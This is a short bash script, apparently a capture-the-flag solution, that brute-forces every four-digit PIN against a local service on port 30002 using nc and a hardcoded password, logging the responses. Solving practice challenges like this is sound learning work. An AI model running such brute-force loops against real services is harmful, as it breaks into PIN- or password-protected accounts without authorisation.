#!/bin/bash

passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

echo '' > result

for a in {0..9}{0..9}{0..9}{0..9}
do
	echo $a
	echo $passwd' '$a | nc localhost 30002 >> result &
done

